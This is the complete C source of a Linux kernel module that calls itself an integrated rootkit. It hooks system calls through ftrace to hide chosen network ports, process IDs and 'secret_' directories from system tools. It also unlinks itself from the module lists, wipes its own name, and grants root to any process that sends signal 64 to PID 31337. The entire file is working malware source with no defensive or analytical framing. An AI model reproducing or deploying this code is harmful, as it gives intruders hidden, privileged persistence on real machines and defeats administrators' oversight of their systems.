#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/seq_file.h>
#include <linux/limits.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/ipv6.h>

#include "ftrace_helper.h"

#define MOD_REVEAL 8000
#define GET_ROOT 31337

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Collaborative Merge");
MODULE_DESCRIPTION("Integrated Rootkit: 61=Port, 62=PID, 63=Module, 64=Root");

/* --- Global Function Pointers --- */
static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);

/* kallsyms helper */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;

/* vmap hiding structures */
static struct list_head *my_vmap_area_list;
static spinlock_t *my_vmap_area_lock;
static struct rb_root *my_vmap_area_root;

/* module hiding state */
static struct list_head *prev_module;
static struct kobject *kobj_parent;
static struct list_head *saved_kobj_entry;
static struct vmap_area *saved_va = NULL;
static short hidden = 0;

/* --- Port Hiding Array Tracker --- */
#define MAX_HIDDEN_PORTS 32
static u16 hidden_ports[MAX_HIDDEN_PORTS] = {0};
static int hidden_ports_count = 0;

/* --- Hidden PID tracking --- */
struct hidden_pid {
    char pid_str[NAME_MAX];
    struct list_head list;
};
static LIST_HEAD(hidden_pids_list);

/* --- Utility Functions --- */
static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;

    if (register_kprobe(&kp) < 0)
        return 0;

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static bool is_port_hidden(u16 port)
{
    int i;

    for (i = 0; i < hidden_ports_count; i++) {
        if (hidden_ports[i] == port)
            return true;
    }
    return false;
}

/* RB-tree insertion helper for vmap_area_root */
static void vmap_area_rb_insert(struct vmap_area *va, struct rb_root *root)
{
    struct rb_node **new = &(root->rb_node);
    struct rb_node *parent = NULL;

    while (*new) {
        struct vmap_area *this = rb_entry(*new, struct vmap_area, rb_node);
        parent = *new;

        if (va->va_start < this->va_start) {
            new = &((*new)->rb_left);
        } else if (va->va_start > this->va_start) {
            new = &((*new)->rb_right);
        } else {
            return;
        }
    }

    rb_link_node(&va->rb_node, parent, new);
    rb_insert_color(&va->rb_node, root);
}

/* Remove THIS_MODULE from vmap structures */
void hideme_memory(void)
{
    /* On modern kernels, we clean the name string from the module's 
       core memory block. This breaks string-based memory scanners. */
    if (THIS_MODULE->name[0] != '\0') {
        memset(THIS_MODULE->name, 0, MODULE_NAME_LEN);
        pr_info("hideme_memory SUCCESS: Wiped module identity from core structures\n");
    } else {
        pr_warn("hideme_memory FAILED: Module identity already empty\n");
    }
}



/* Restore THIS_MODULE into vmap structures */
void showme_memory(void)
{
    if (saved_va && my_vmap_area_list && my_vmap_area_lock) {
        spin_lock(my_vmap_area_lock);

        list_add(&saved_va->list, my_vmap_area_list);

        if (my_vmap_area_root)
            vmap_area_rb_insert(saved_va, my_vmap_area_root);

        spin_unlock(my_vmap_area_lock);
        saved_va = NULL;
    }
}

/* Full structural hide */
void hideme_full(void)
{
    if (hidden)
        return;

    /* 1. Execute modern memory identification scrubbing first */
    hideme_memory();

    /* 2. Backup and unlink tracking metrics from standard lists */
    prev_module = THIS_MODULE->list.prev;
    kobj_parent = THIS_MODULE->mkobj.kobj.parent;

    list_del(&THIS_MODULE->list);

    if (THIS_MODULE->mkobj.kobj.entry.prev) {
        saved_kobj_entry = THIS_MODULE->mkobj.kobj.entry.prev;
        list_del(&THIS_MODULE->mkobj.kobj.entry);
    }

    hidden = 1;
    pr_info("[deception] Module is now fully hidden from lists and scanners.\n");
}


void showme_full(void)
{
    if (!hidden)
        return;

    /* 1. Restore the module's string identity back to memory */
    if (THIS_MODULE->name[0] == '\0') {
        strscpy(THIS_MODULE->name, "deception", MODULE_NAME_LEN);
    }

    /* 2. Restore to standard tracking linked lists */
    if (prev_module)
        list_add(&THIS_MODULE->list, prev_module);

    if (saved_kobj_entry)
        list_add(&THIS_MODULE->mkobj.kobj.entry, saved_kobj_entry);

    hidden = 0;
    pr_info("[deception] Module successfully revealed.\n");
}



/* PID helpers */
static struct hidden_pid *find_hidden_pid(const char *name)
{
    struct hidden_pid *entry;

    list_for_each_entry(entry, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0)
            return entry;
    }
    return NULL;
}

static int remove_hidden_pid(const char *name)
{
    struct hidden_pid *entry, *tmp;

    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) {
            list_del(&entry->list);
            kfree(entry);
            return 1;
        }
    }
    return 0;
}

static void clear_all_hidden_pids(void)
{
    struct hidden_pid *entry, *tmp;

    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        list_del(&entry->list);
        kfree(entry);
    }
}

/* root escalation */
void set_root(void)
{
    struct cred *root = prepare_creds();

    if (!root)
        return;

    root->uid.val  = 0;
    root->gid.val  = 0;
    root->euid.val = 0;
    root->egid.val = 0;

    commit_creds(root);
}

/* --- Hook Implementations --- */

/* Netlink recvmsg hook: hides entries for hidden ports */
asmlinkage long hook_recvmsg(const struct pt_regs *regs)
{
    struct msghdr __user *msg = (struct msghdr __user *)regs->si;
    struct user_msghdr umsg;
    struct iovec uiov;
    struct nlmsghdr *nlh;
    long ret = orig_recvmsg(regs);
    long offset = 0;
    void __user *iov_base;
    void *kbuf;

    if (ret <= 0 || hidden_ports_count == 0)
        return ret;

    if (copy_from_user(&umsg, msg, sizeof(umsg)) ||
        copy_from_user(&uiov, umsg.msg_iov, sizeof(uiov)))
        return ret;

    iov_base = uiov.iov_base;
    if (!iov_base)
        return ret;

    kbuf = kvzalloc(ret, GFP_KERNEL);
    if (!kbuf || copy_from_user(kbuf, iov_base, ret)) {
        kvfree(kbuf);
        return ret;
    }

    while (offset + NLMSG_HDRLEN <= ret) {
        long rem = ret - offset;
        nlh = (struct nlmsghdr *)(kbuf + offset);

        if (!NLMSG_OK(nlh, rem))
            break;

        if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR) {
            offset += NLMSG_ALIGN(nlh->nlmsg_len);
            continue;
        }

        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {

            struct inet_diag_msg *diag = (struct inet_diag_msg *)NLMSG_DATA(nlh);
            bool hide = false;

            if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
                is_port_hidden(ntohs(diag->id.idiag_dport))) {
                hide = true;
            }

            if (hide) {
                size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
                
                /* Overwrite the entire netlink entry payload with zeroes */
                memset(NLMSG_DATA(nlh), 0, msg_len - NLMSG_HDRLEN);
                
                /* Turn the header into a NOOP so the ss parser skips it safely */
                nlh->nlmsg_type = NLMSG_NOOP;
            }
        }

        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    /* Copy back the exact total length (ret) to prevent truncation errors */
    copy_to_user(iov_base, kbuf, ret);
    kvfree(kbuf);
    return ret;
}

/* getdents64 hook: hides PIDs and secret_ directories */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdirent, *cur;
    int ret = orig_getdents64(regs);
    long bpos = 0;

    if (ret <= 0)
        return ret;

    kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent || copy_from_user(kdirent, dirent, ret)) {
        kvfree(kdirent);
        return ret;
    }

    while (bpos < ret) {
        cur = (void *)kdirent + bpos;
        bool hide = false;

        if (cur->d_reclen == 0)
            break;

        if (!list_empty(&hidden_pids_list) &&
            find_hidden_pid(cur->d_name))
            hide = true;

        if (!hide &&
            (cur->d_type == DT_DIR || cur->d_type == DT_UNKNOWN)) {
            if (strncmp(cur->d_name, "secret_", 7) == 0)
                hide = true;
        }

        if (hide) {
            long reclen = cur->d_reclen;
            long tail   = ret - (bpos + reclen);

            if (tail > 0)
                memmove(cur, (void *)cur + reclen, tail);
            ret -= reclen;
        } else {
            bpos += cur->d_reclen;
        }
    }

    copy_to_user(dirent, kdirent, ret);
    kvfree(kdirent);
    return ret;
}

/* kill hook: signals 61–64 control ports, PIDs, module, root */
asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs_get_kernel_argument(regs, 0);
    int   sig = (int)regs_get_kernel_argument(regs, 1);

    struct hidden_pid *pid_entry;
    char pid_str[NAME_MAX];

    /* Signal 64: privilege escalation */
    if (sig == 64 && pid == GET_ROOT) {
        set_root();
        return 0;
    }

    /* Signal 63: toggle module visibility */
    if (sig == 63 && pid == MOD_REVEAL) {
        if (hidden) {
            showme_full();
        } else {
            hideme_full();
        }
        return 0;
    }

    /* Signal 62: hide a specific PID */
    if (sig == 62) {
        snprintf(pid_str, sizeof(pid_str), "%d", pid);
        pid_entry = find_hidden_pid(pid_str);
        if (!pid_entry) {
            pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
            if (pid_entry) {
                strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
                list_add(&pid_entry->list, &hidden_pids_list);
                pr_info("[deception] PID %s is now hidden\n", pid_str);
            }
        }
        return 0;
    }

    /* Signal 61: hide a network port */
    if (sig == 61) {
        if (hidden_ports_count < MAX_HIDDEN_PORTS) {
            hidden_ports[hidden_ports_count++] = (u16)pid;
            pr_info("[deception] Port %d is now hidden\n", pid);
        }
        return 0;
    }

    /* Fallback: Pass standard signals to the original system call */
    return orig_kill(regs);
}


/* --- Network Seq Show Hooks (IPv6 only) --- */

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    /* IPv6 address hiding removed */

    if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
        struct sock *sk = (struct sock *)v;

        if (sk->sk_state == TCP_TIME_WAIT) {
            struct inet_timewait_sock *tw =
                (struct inet_timewait_sock *)v;

            if (is_port_hidden(ntohs(tw->tw_sport)) ||
                is_port_hidden(ntohs(tw->tw_dport)))
                return 0;
        } else {
            struct inet_sock *inet = inet_sk(sk);

            if (is_port_hidden(ntohs(inet->inet_sport)) ||
                is_port_hidden(ntohs(inet->inet_dport)))
                return 0;
        }
    }

    return orig_tcp6_seq_show(seq, v);
}

/* --- FTrace Hook Definitions Configuration (IPv6-only) --- */
static struct ftrace_hook fh_hooks[] = {
    HOOK("__x64_sys_recvmsg",   hook_recvmsg,   &orig_recvmsg),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill",      hook_kill,      &orig_kill),
    HOOK("tcp6_seq_show",       hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};

/* --- Module Initialization --- */
static int __init deception_init(void)
{
    int err;
    pr_info("[deception] Resolving unexported kernel structures...\n");

    /* 1. Resolve symbols using your lookup_name wrapper */
    my_vmap_area_list = (struct list_head *)lookup_name("vmap_area_list");
    my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
    my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");

    /* 2. Activate the FTRACE hooks using the correct array name */
    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    if (err) {
        pr_err("[deception] Ftrace hook installation FAILED with error: %d\n", err);
        return err;
    }
    pr_info("[deception] Ftrace hooks successfully installed.\n");

    /* 3. Hide module tracking references safely */
    hideme_full();

    return 0;
}

static void __exit deception_exit(void)
{
    pr_info("[deception] Removing ftrace hooks and cleaning up...\n");
    
    /* Turn off the ftrace hooks safely using the correct array name */
    fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    
    /* Put the module back into standard lists so rmmod works */
    showme_full();
    clear_all_hidden_pids();
}


module_init(deception_init);
module_exit(deception_exit);
